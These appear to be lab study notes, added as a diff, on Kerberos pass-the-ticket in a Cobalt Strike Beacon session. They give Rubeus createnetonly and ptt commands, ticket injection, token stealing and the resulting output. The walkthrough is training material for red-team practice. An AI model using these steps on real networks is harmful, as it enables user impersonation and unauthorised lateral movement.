@@ -66,3 +66,57 @@ Next, `kerberos_ticket_use` will inject the given ticket into this new session.
 ```powershell
 beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
 ```
+
+The klist output will now show the injected ticket.
+
+![[Pasted image 20250710225017.png]]
+
+Any Kerberos authentication that the Beacon now performs will be under the context of rsteel.  If at any point you want to remove the tickets from this session, but without actually disposing of the session itself, use `kerberos_ticket_purge`.  When we no longer need the session, use `rev2self` to dispose of it, and the Beacon session goes back to pchilds' context.
+
+### The Rubeus way
+There are some limitations with Beacon's built-in `kerberos_ticket_use` command.  The first is that it will only inject TGTs and not service tickets.  The second is that it only accepts .kirbi files on disk, which can be cumbersome.
+
+Rubeus' `ptt` command can inject both TGTs and service ticket, and can accept base64 encoded tickets.  The syntax is `ptt /luid:[luid] /ticket:[ticket]`.  The ticket parameter can be the base64 encoded ticket, or a path to a .kirbi on disk (in this case it would be the disk of the machine Beacon is running on, not the machine running the CS client).
+
+Rubeus also has a `createnetonly` command which can be used instead of Beacon's `make_token` command.  This spawns a hidden process in a new logon session and returns the PID and LUID.
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
+
+[*] Action: Create Process (/netonly)
+
+[*] Using CONTOSO.COM\rsteel:FakePass
+
+[*] Showing process : False
+[*] Username        : rsteel
+[*] Domain          : CONTOSO.COM
+[*] Password        : FakePass
+[+] Process         : 'C:\Windows\notepad.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 2524
+[+] LUID            : 0x132ef34
+```
+
+A ticket can then be injected.
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDC<SNIP>TAyMjQxMzQyMza3JidGd0GwtDT05UT1NPLkNPTQ==
+
+[*] Action: Import Ticket
+[*] Target LUID: 0x132ef34
+[+] Ticket successfully imported!
+```
+
+Then steal the token of the spawned process to utilise the ticket.
+
+```powershell
+beacon> steal_token 2524
+[+] Impersonated CONTOSO\pchilds
+```
+
+To drop the impersonation, run `rev2self` then terminate the spawned process using Beacon's `kill` command.
+
+> This worked but it's a logon type 9 so the network credentials will be for rsteel
+
+### The getuid Confusion
+
+> Many students see the above output of `steal_token` and are confused as to why it would say _pchilds_ and not _rsteel_.  This is because the user information returned by `steal_token` and `getuid` is taken from the primary access token of the process.  It does not matter if you pass alternate credential material into the logon session to which the process is linked, either by PtH or PtT, the username returned will always be that of the user that spawned the process.
